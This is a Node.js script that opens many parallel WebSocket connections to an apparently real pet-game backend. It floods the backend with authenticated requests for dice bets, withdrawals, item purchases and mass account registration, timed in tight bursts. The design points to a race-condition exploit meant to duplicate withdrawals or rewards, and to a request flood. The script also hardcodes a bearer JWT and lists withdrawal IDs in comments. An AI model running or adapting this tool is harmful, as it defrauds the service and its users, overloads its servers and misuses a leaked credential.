import WebSocket from "ws";
import { v4 as uuidv4 } from "uuid";

const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.app/";
const origin = "https://app.pett.ai";
const pettName = `ao_cb_${Math.floor(Math.random() * 999)}_rs_${Math.floor(Math.random() * 999)}`;

const jwt = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWZoY2dhdXkwMDVoanUwYXkwMnc4YmV5IiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTc3MjY2NDgsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21lbnNmaGFlMDA2ZGw5MGNrdjU2cmtyYSIsImV4cCI6MTc1NzczMDI0OH0.slh5_OeknXw3HrAoZDcsnkNKmYTOL10ASNyp3TFpstOoJu8ogFVB4-qjI37Z3AD8o4DmmMGf2VT48DDwKDgABw"

const type = "food"; 

//  Change this to food for level up
// Run it until level says 10

// withdrawal IDs
const withdrawalIds = [

];


const withdrawalId = withdrawalIds[Math.floor(Math.random() * withdrawalIds.length)];

// "5b6f3c83-a6d8-4be3-a7bc-4cf08435e6d6"
// "7a9f5230-4264-4971-951c-90cc40a0efe2"
// "6d6a442e-1c2e-4f3f-9ac4-f7e6b7dda3d4"
// "af723d9a-bd6b-4966-8f7d-1b8795dce152"
// "3ff4be62-4b4e-4255-b1ed-aae2d2dd6c6b"
// "e4604cf3-c4e3-4da8-9c1a-a3a0c0919e70"
// "366b06a4-1b00-4f79-b760-ec2820f9e721"
// "e78e5448-9e0c-4cf1-9b3d-f835d617bc5e"
// "92ad3bb3-ded7-4cc9-a41d-98114ef0cfdd"


// ---- HELPERS ----
const makeRegisterString = () => JSON.stringify({
  type: "REGISTER",
  data: { params: { authType: "privy", registerHash: { hash: jwt, name: pettName } } },
  nonce: uuidv4(),
});

const makeAuthString = () => JSON.stringify({
  type: "AUTH",
  data: { params: { authType: "privy", authHash: { hash: jwt } } },
  nonce: uuidv4(),
});

const makeJumpString = () => JSON.stringify({
  type: "WITHDRAWAL_JUMP",
  data: { params: { withdrawalId } },
  nonce: uuidv4(),
});

const makeWithdrawString = () => JSON.stringify({
  type: "WITHDRAWAL_USE",
  data: { params: { withdrawalId } },
  nonce: uuidv4(),
});

const makeDoorString = () => JSON.stringify({
  type: "PLAY_DOORS",
  data: {},
  nonce: uuidv4(),
});

const makeBuyString = () => JSON.stringify({
  type: "CONSUMABLES_BUY",
  data: { params: { foodId: "ENERGIZER", amount: 1 } },
  nonce: uuidv4(),
});

function chooseDiceBet(mode = "number") {
  if (mode === "number") {
    if (Math.random() < 0.7) {
      return Math.random() < 0.5 ? 3 : 4;
    } else {
      return Math.floor(Math.random() * 6) + 1;
    }
  } else if (mode === "even") {
    return "EVEN";
  } else if (mode === "odd") {
    return "ODD";
  }
}

const makeDiceString = (betAmount, mode) => {
  const choice = chooseDiceBet(mode);
  return JSON.stringify({
    type: "PLAY_DICE",
    data: {
      params: {
        betAmount,
        selectedBet: { number: choice, type: "number" },
      },
    },
    nonce: uuidv4(),
  });
};

// ---- CONFIG PER TYPE ----
const CONFIGS = {
  dice: {
    TOTAL_SOCKETS: 10,
    REQUESTS_PER_SOCKET: 20,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 500,
    handler: (ws) => {
      ws.send(makeAuthString());
      ws.send(makeDiceString(5000, "number"));
    },
  },
  jump: {
    TOTAL_SOCKETS: 1,
    REQUESTS_PER_SOCKET: 1,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 500,
    handler: (ws) => {
      ws.send(makeAuthString());
      ws.send(makeJumpString());
    },
  },
  withdraw: {
    TOTAL_SOCKETS: 10,
    REQUESTS_PER_SOCKET: 1,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 1000,
    handler: (ws) => {
      ws.send(makeAuthString());
      ws.send(makeWithdrawString());
    },
  },
  door: {
    TOTAL_SOCKETS: 10,
    REQUESTS_PER_SOCKET: 20,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 500,
    handler: (ws) => {
      ws.send(makeAuthString());
      ws.send(makeDoorString());
    },
  },
  food: {
    TOTAL_SOCKETS: 10,
    REQUESTS_PER_SOCKET: 20,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 500,
    handler: (ws) => {
      ws.send(makeAuthString());
      ws.send(makeBuyString());
    },
  },
  register: {
    TOTAL_SOCKETS: 550,
    REQUESTS_PER_SOCKET: 10,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 30000,
    handler: (ws) => {
      ws.send(makeRegisterString());
    },
  },
};

// ---- STATE ----
const { TOTAL_SOCKETS, REQUESTS_PER_SOCKET, BLAST_DURATION_MS, REST_BETWEEN_WAVES_MS, handler } =
  CONFIGS[type];

let sockets = [];
let totalSent = 0;
let totalReceived = 0;
let waveCounter = 0;
let blasting = false;

// ---- send gradually ----
function blastWave() {
  const live = sockets.filter((s) => s.ws.readyState === WebSocket.OPEN);
  if (!live.length) {
    console.log("⚠ No live sockets remain, stopping");
    return;
  }

  blasting = true;
  waveCounter++;
  let sent = 0;
  const interval = BLAST_DURATION_MS / REQUESTS_PER_SOCKET;

  for (const { ws } of live) {
    for (let j = 0; j < REQUESTS_PER_SOCKET; j++) {
      setTimeout(() => {
        try {
          handler(ws);
          sent++;
        } catch {}
      }, j * interval);
    }
  }

  setTimeout(() => {
    totalSent += sent;
    console.log(
      `⚡ Wave #${waveCounter}: sent=${sent} · liveSockets=${live.length} · totalSent=${totalSent}`
    );
    blasting = false;
    setTimeout(blastWave, REST_BETWEEN_WAVES_MS);
  }, BLAST_DURATION_MS + 20);
}

// ---- sockets ----
function connectSocket(socketId) {
  const headers = {
    Origin: origin,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  };

  const ws = new WebSocket(endpoint, { headers, perMessageDeflate: false });

  ws.on("open", () => {
    sockets.push({ ws, id: socketId });
    console.log(`✅ Socket ${socketId} connected (${sockets.length}/${TOTAL_SOCKETS})`);

    if (sockets.length === TOTAL_SOCKETS && !blasting) {
      console.log("🚀 All sockets ready — starting waves");
      blastWave();
    }
  });

  ws.on("message", (m) => {
    const msg = JSON.parse(m.toString());
    console.log(msg);
    if (msg.error?.toLowerCase() === "user already created") {
      totalReceived += 1;
    }
    console.log("Total cm Received=" + totalReceived);
  });

  ws.on("close", () => {
    console.log(`🔒 Socket ${socketId} closed`);
    sockets = sockets.filter((s) => s.id !== socketId);
  });

  ws.on("error", (err) => {
    console.error(`❌ Socket ${socketId} error:`, err.message);
  });
}

// ---- boot ----
console.log(`🔌 Opening ${TOTAL_SOCKETS} sockets…`);
for (let i = 0; i < TOTAL_SOCKETS; i++) connectSocket(i + 1);
